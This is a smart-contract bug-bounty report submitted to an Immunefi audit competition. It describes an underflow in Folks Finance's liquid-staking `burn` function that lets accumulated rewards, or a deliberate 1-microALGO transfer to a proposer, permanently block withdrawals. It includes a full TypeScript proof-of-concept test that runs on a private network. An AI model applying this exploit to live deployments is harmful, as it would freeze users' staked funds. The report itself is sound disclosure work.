# #37940 \[SC-High] freezing of user funds when reward accumulated or added

## #37940 \[SC-High] Freezing of user funds When Reward accumulated or added

**Submitted on Dec 19th 2024 at 09:51:34 UTC by @Blockian for** [**Audit Comp | Folks: Liquid Staking**](https://immunefi.com/audit-competition/folks-finance-liquid-staking-audit-competition)

* **Report ID:** #37940
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/Folks-Finance/algo-liquid-staking-contracts/blob/8bd890fde7981335e9b042a99db432e327681e1a/contracts/xalgo/consensus\\_v2.py>
* **Impacts:**
  * Permanent freezing of funds

### Description

## Folks Finance Liquid Staking Bug Report

### Freezing of user funds

#### Description

When rewards are accumulated, the `burn` function will get frozen.

This allows a malicious actor to cause the `burn` function to revert, locking user funds.

#### Root Cause

The issue lies in how the `burn` function calculates the amount of ALGO to be returned to the user. The logic follows these steps:

```python
algo_balance.store(
    App.globalGet(total_active_stake_key)
    + App.globalGet(total_rewards_key)
    - App.globalGet(total_unclaimed_fees_key)
),
algo_to_send.store(
    mul_scale(
        burn_amount,
        algo_balance.load(),
        get_x_algo_circulating_supply() + burn_amount
    )
),
# not interesting
send_algo_from_proposers(Txn.sender(), algo_to_send.load()),
# update total active stake
App.globalPut(total_active_stake_key, App.globalGet(total_active_stake_key) - algo_to_send.load()),
```

The issue arises as follows:

1. Rewards accumulation causes the `algo_balance` (total amount of ALGO) to increase.
2. However, the `get_x_algo_circulating_supply` remains constant.
3. When calculating `algo_to_send`, the proportion becomes skewed, potentially resulting in `algo_to_send` exceeding the value of `total_active_stake_key`.

This discrepancy triggers an underflow during the calculation:

```python
App.globalPut(total_active_stake_key, App.globalGet(total_active_stake_key) - algo_to_send.load())
```

As a result, the transaction reverts, preventing the `burn` function from completing successfully.

#### Impact

This vulnerability effectively freezes user funds within the protocol because the `burn` function becomes unusable. The issue can be exploited in the following scenarios:

**Malicious Interaction:**

* A malicious actor deliberately manipulates the proposer’s account to trigger the underflow, freezing the `burn` functionality.

**Innocent Interaction:**

* A proposer simply accumulates rewards over time, unintentionally leading to the same issue.

### Proof of Concept

## POC

Run this test file, the `IMMUNEFI POC` test is the main test to watch

```ts
import {
  ABIContract,
  Account,
  Algodv2,
  AtomicTransactionComposer,
  decodeAddress,
  decodeUint64,
  encodeUint64,
  generateAccount,
  getApplicationAddress,
  getMethodByName,
  IntDecoding,
  makeApplicationCreateTxn,
  makeApplicationUpdateTxn,
  makeBasicAccountTransactionSigner,
  modelsv2,
  OnApplicationComplete,
} from "algosdk";
import { mulScale, mulScaleRoundUp, ONE_16_DP, ONE_4_DP } from "folks-finance-js-sdk";
import { sha256 } from "js-sha256";
import { prepareOptIntoAssetTxn } from "./transactions/common";
import {
  parseXAlgoConsensusV1GlobalState,
  prepareAddProposerForXAlgoConsensus,
  prepareBurnFromXAlgoConsensusV2,
  prepareClaimDelayedMintFromXAlgoConsensus,
  prepareClaimXAlgoConsensusV2Fee,
  prepareDelayedMintFromXAlgoConsensusV2,
  prepareImmediateMintFromXAlgoConsensusV2,
  prepareInitialiseXAlgoConsensusV1,
  prepareInitialiseXAlgoConsensusV2,
  preparePauseXAlgoConsensusMinting,
  prepareRegisterXAlgoConsensusOffline,
  prepareRegisterXAlgoConsensusOnline,
  prepareScheduleXAlgoConsensusSCUpdate,
  prepareUpdateXAlgoConsensusAdmin,
  prepareUpdateXAlgoConsensusV2Fee,
  prepareUpdateXAlgoConsensusPremium,
  prepareUpdateXAlgoConsensusMaxProposerBalance,
  prepareUpdateXAlgoConsensusSC,
  prepareSetXAlgoConsensusProposerAdmin,
  prepareSubscribeXAlgoConsensusProposerToXGov,
  prepareUnsubscribeXAlgoConsensusProposerFromXGov,
  prepareXAlgoConsensusDummyCall,
  parseXAlgoConsensusV2GlobalState,
  prepareCreateXAlgoConsensusV1,
  prepareMintFromXAlgoConsensusV1,
} from "./transactions/xAlgoConsensus";
import { getABIContract } from "./utils/abi";
import { getAlgoBalance, getAssetBalance } from "./utils/account";
import {
  compilePyTeal,
  compileTeal,
  enc,
  getAppGlobalState,
  getParsedValueFromState,
  parseUint64s
} from "./utils/contracts";
import { fundAccountWithAlgo } from "./utils/fund";
import { privateAlgodClient, startPrivateNetwork, stopPrivateNetwork } from "./utils/privateNetwork";
import { advanceBlockRounds, advancePrevBlockTimestamp } from "./utils/time";
import { getParams, submitGroupTransaction, submitTransaction } from "./utils/transaction";

jest.setTimeout(1000000);

describe("Algo Consensus V2", () => {
  let algodClient: Algodv2;
  let prevBlockTimestamp: bigint;
  let user1: Account = generateAccount();
  let user2: Account = generateAccount();
  let proposer0: Account = generateAccount();
  let proposer1: Account = generateAccount();
  let admin: Account = generateAccount();
  let registerAdmin: Account = generateAccount();
  let xGovAdmin: Account = generateAccount();
  let proposerAdmin: Account = generateAccount();
  let xAlgoAppId: number, xAlgoId: number;
  let xAlgoConsensusABI: ABIContract;

  let xGovRegistryAppId: number;
  let xGovRegistryABI: ABIContract;
  let xGovFee: bigint;

  const timeDelay = BigInt(86400);
  const minProposerBalance = BigInt(5e6);
  const maxProposerBalance = BigInt(500e6);
  const premium = BigInt(0.001e16); // 0.1%
  const fee = BigInt(0.1e4); // 10%

  const nonce = Uint8Array.from([0, 0]);
  const resizeProposerBoxCost = BigInt(16000);
  const updateSCBoxCost = BigInt(32100);
  const delayMintBoxCost = BigInt(36100);

  async function getXAlgoRate() {
    const atc = new AtomicTransactionComposer();
    atc.addMethodCall({
      sender: user1.addr,
      signer: makeBasicAccountTransactionSigner(user1),
      appID: xAlgoAppId,
      method: getMethodByName(xAlgoConsensusABI.methods, "get_xalgo_rate"),
      methodArgs: [],
      suggestedParams: await getParams(algodClient),
    });
    const simReq = new modelsv2.SimulateRequest({
      txnGroups: [],
      allowUnnamedResources: true,
    })
    const { methodResults }  = await atc.simulate(algodClient, simReq);
    const { returnValue } = methodResults[0];
    const [algoBalance, xAlgoCirculatingSupply, balances]: [bigint, bigint, Uint8Array] = returnValue as any;
    const proposersBalances = parseUint64s(Buffer.from(balances).toString("base64"));
    return { algoBalance, xAlgoCirculatingSupply, proposersBalances } ;
  }

  beforeAll(async () => {
    await startPrivateNetwork();
    algodClient = privateAlgodClient();
    algodClient.setIntEncoding(IntDecoding.MIXED);

    // initialise accounts with algo
    await fundAccountWithAlgo(algodClient, user1.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, user2.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, admin.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, registerAdmin.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, xGovAdmin.addr, 1000e6, await getParams(algodClient));
    await fundAccountWithAlgo(algodClient, proposerAdmin.addr, 1000e6, await getParams(algodClient));

    // advance time well past current time so we are dealing with deterministic time using offsets
    prevBlockTimestamp = await advancePrevBlockTimestamp(algodClient, 1000);

    // deploy xgov registry
    const approval = await compileTeal(compilePyTeal('contracts/testing/xgov_registry'));
    const clear = await compileTeal(compilePyTeal('contracts/common/clear_program', 10));
    const tx = makeApplicationCreateTxn(user1.addr, await getParams(algodClient), OnApplicationComplete.NoOpOC, approval, clear, 0, 0, 1, 0);
    const txId = await submitTransaction(algodClient, tx, user1.sk);
    const txInfo = await algodClient.pendingTransactionInformation(txId).do();
    xGovRegistryAppId = txInfo["application-index"];
    xGovRegistryABI = getABIContract('contracts/testing/xgov_registry');
    xGovFee = BigInt(getParsedValueFromState(await getAppGlobalState(algodClient, xGovRegistryAppId), "xgov_fee") || 0);
  });

  afterAll(() => {
    stopPrivateNetwork();
  });

  describe("creation" , () => {
    test("succeeds in updating from x algo consensus v1 to x algo consensus v2", async () => {
      // deploy algo consensus v1
      const { tx: createTx, abi } = await prepareCreateXAlgoConsensusV1(admin.addr, admin.addr, registerAdmin.addr, minProposerBalance, maxProposerBalance, premium, fee, await getParams(algodClient));
      xAlgoConsensusABI = abi;
      let txId = await submitTransaction(algodClient, createTx, admin.sk);
      let txInfo = await algodClient.pendingTransactionInformation(txId).do();
      xAlgoAppId = txInfo["application-index"];

      // fund minimum balance
      await fundAccountWithAlgo(algodClient, proposer0.addr, BigInt(0.1e6), await getParams(algodClient));
      await fundAccountWithAlgo(algodClient, getApplicationAddress(xAlgoAppId), 0.6034e6);

      // initialise algo consensus v1
      const initTxns = prepareInitialiseXAlgoConsensusV1(xAlgoConsensusABI, xAlgoAppId, admin.addr, proposer0.addr, await getParams(algodClient));
      [, txId] = await submitGroupTransaction(algodClient, initTxns, [proposer0.sk, admin.sk]);
      txInfo = await algodClient.pendingTransactionInformation(txId).do();
      xAlgoId = txInfo['inner-txns'][0]['asset-index'];

      // verify xAlgo was created
      const assetInfo = await algodClient.getAssetByID(xAlgoId).do();
      expect(assetInfo.params.creator).toEqual(getApplicationAddress(xAlgoAppId));
      expect(assetInfo.params.reserve).toEqual(getApplicationAddress(xAlgoAppId));
      expect(assetInfo.params.total).toEqual(BigInt(10e15));
      expect(assetInfo.params.decimals).toEqual(6);
      expect(assetInfo.params.name).toEqual('Governance xAlgo');
      expect(assetInfo.params['unit-name']).toEqual('xALGO');

      // opt into xALGO
      let optInTx = prepareOptIntoAssetTxn(admin.addr, xAlgoId, await getParams(algodClient));
      await submitTransaction(algodClient, optInTx, admin.sk);
      optInTx = prepareOptIntoAssetTxn(user1.addr, xAlgoId, await getParams(algodClient));
      await submitTransaction(algodClient, optInTx, user1.sk);
      optInTx = prepareOptIntoAssetTxn(user2.addr, xAlgoId, await getParams(algodClient));
      await submitTransaction(algodClient, optInTx, user2.sk);

      // mint to get pool started
      const mintAmount = BigInt(100e6);
      const mintTxns = prepareMintFromXAlgoConsensusV1(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user2.addr, mintAmount, proposer0.addr, await getParams(algodClient));
      await submitGroupTransaction(algodClient, mintTxns, mintTxns.map(() => user2.sk));

      // verify global state
      const state = await parseXAlgoConsensusV1GlobalState(algodClient, xAlgoAppId);
      expect(state.initialised).toEqual(true);
      expect(state.admin).toEqual(admin.addr);
      expect(state.registerAdmin).toEqual(registerAdmin.addr);
      expect(state.xAlgoId).toEqual(xAlgoId);
      expect(state.numProposers).toEqual(BigInt(1));
      expect(state.minProposerBalance).toEqual(minProposerBalance);
      expect(state.maxProposerBalance).toEqual(maxProposerBalance);
      expect(state.fee).toEqual(fee);
      expect(state.premium).toEqual(premium);
      expect(state.totalPendingStake).toEqual(BigInt(0));
      expect(state.totalActiveStake).toEqual(mintAmount);
      expect(state.totalRewards).toEqual(BigInt(0));
      expect(state.totalUnclaimedFees).toEqual(BigInt(0));
      expect(state.canImmediateMint).toEqual(true);
      expect(state.canDelayMint).toEqual(false);

      // verify proposers box
      const proposersBox = await algodClient.getApplicationBoxByName(xAlgoAppId, enc.encode("pr")).do();
      const proposers = new Uint8Array(960);
      proposers.set(decodeAddress(proposer0.addr).publicKey, 0);
      expect(proposersBox.value).toEqual(proposers);

      // verify added proposer box
      const boxName = Uint8Array.from([...enc.encode("ap"), ...decodeAddress(proposer0.addr).publicKey]);
      const addedProposerBox = await algodClient.getApplicationBoxByName(xAlgoAppId, boxName).do();
      expect(addedProposerBox.value).toEqual(new Uint8Array(0));

      // verify balances
      const user2XAlgoBalance = await getAssetBalance(algodClient, user2.addr, xAlgoId);
      expect(user2XAlgoBalance).toEqual(mintAmount);

      // update to algo consensus v2
      const approval = await compileTeal(compilePyTeal('contracts/xalgo/consensus_v2'));
      const clear = await compileTeal(compilePyTeal('contracts/common/clear_program', 10));
      const updateTx = makeApplicationUpdateTxn(admin.addr, await getParams(algodClient), xAlgoAppId, approval, clear);
      await submitTransaction(algodClient, updateTx, admin.sk);
      xAlgoConsensusABI = getABIContract('contracts/xalgo/consensus_v2');
    });
  });

  describe("initialise", () => {
    test("succeeds for admin", async () => {
      const oldState = await parseXAlgoConsensusV1GlobalState(algodClient, xAlgoAppId);

      // initialise
      const tx = prepareInitialiseXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, admin.addr, await getParams(algodClient));
      await submitTransaction(algodClient, tx, admin.sk);

      // verify global state
      const unformattedState = await getAppGlobalState(algodClient, xAlgoAppId);
      expect(getParsedValueFromState(unformattedState, "initialised")).toBeUndefined();
      expect(getParsedValueFromState(unformattedState, "min_proposer_balance")).toBeUndefined();

      const state = await parseXAlgoConsensusV2GlobalState(algodClient, xAlgoAppId);
      expect(state.initialised).toEqual(true);
      expect(state.admin).toEqual(oldState.admin);
      expect(state.xGovAdmin).toEqual(oldState.admin);
      expect(state.registerAdmin).toEqual(oldState.registerAdmin);
      expect(state.xAlgoId).toEqual(oldState.xAlgoId);
      expect(state.numProposers).toEqual(oldState.numProposers);
      expect(state.maxProposerBalance).toEqual(oldState.maxProposerBalance);
      expect(state.fee).toEqual(oldState.fee);
      expect(state.premium).toEqual(oldState.premium);
      expect(state.totalPendingStake).toEqual(oldState.totalPendingStake);
      expect(state.totalActiveStake).toEqual(oldState.totalActiveStake);
      expect(state.totalRewards).toEqual(oldState.totalRewards);
      expect(state.totalUnclaimedFees).toEqual(oldState.totalUnclaimedFees);
      expect(state.canImmediateMint).toEqual(oldState.canImmediateMint);
      expect(state.canDelayMint).toEqual(oldState.canDelayMint);

      // const { algoBalance: a, xAlgoCirculatingSupply: b, proposersBalances: c } = await getXAlgoRate();

      // console.log(`algoBalance: ${a}, xAlgoCirculatingSupply: ${b}, proposersBalances: ${c}`)
    });
  });

  describe("IMMUNEFI POC: Rewards accumulated brick burn system", () => {
    const proposerAddrs = [proposer0.addr, proposer1.addr];

    beforeAll(async () => {
      // fund proposer
      await fundAccountWithAlgo(algodClient, proposer1.addr, BigInt(0.1e6), await getParams(algodClient)); // supply 0.2e6 to opt in to xAlgo

      // opt in to xAlgo before adding proposer
      // const optInTx = prepareOptIntoAssetTxn(proposer1.addr, xAlgoId, await getParams(algodClient));
      // await submitTransaction(algodClient, optInTx, proposer1.sk);

      // add proposer1
      const minBalance = BigInt(16100);
      await fundAccountWithAlgo(algodClient, getApplicationAddress(xAlgoAppId), minBalance, await getParams(algodClient));

      // register
      const txnsAddProposer = prepareAddProposerForXAlgoConsensus(xAlgoConsensusABI, xAlgoAppId, registerAdmin.addr, proposer1.addr, await getParams(algodClient));
      const [, txIdAddProposer] = await submitGroupTransaction(algodClient, txnsAddProposer, [proposer1.sk, registerAdmin.sk]);
      await algodClient.pendingTransactionInformation(txIdAddProposer).do();

      console.log("added second proposer proposer");
    })

    test("user can't withdraw Algo", async () => {
      await fundAccountWithAlgo(algodClient, proposer1.addr, BigInt(1), await getParams(algodClient)); // supply 1 to proposer

      const { algoBalance: a, xAlgoCirculatingSupply: b, proposersBalances: c } = await getXAlgoRate(); // debug

      console.log(`algoBalance: ${a}, xAlgoCirculatingSupply: ${b}, proposersBalances: ${c}`); // debug

      const { xAlgoCirculatingSupply: xAlgoToBurn } = await getXAlgoRate();

      const txns = prepareBurnFromXAlgoConsensusV2(xAlgoConsensusABI, xAlgoAppId, xAlgoId, user2.addr, xAlgoToBurn, BigInt(0), proposerAddrs, await getParams(algodClient));

      await submitGroupTransaction(algodClient, txns, txns.map(() => user2.sk))
    });
  });
});
```
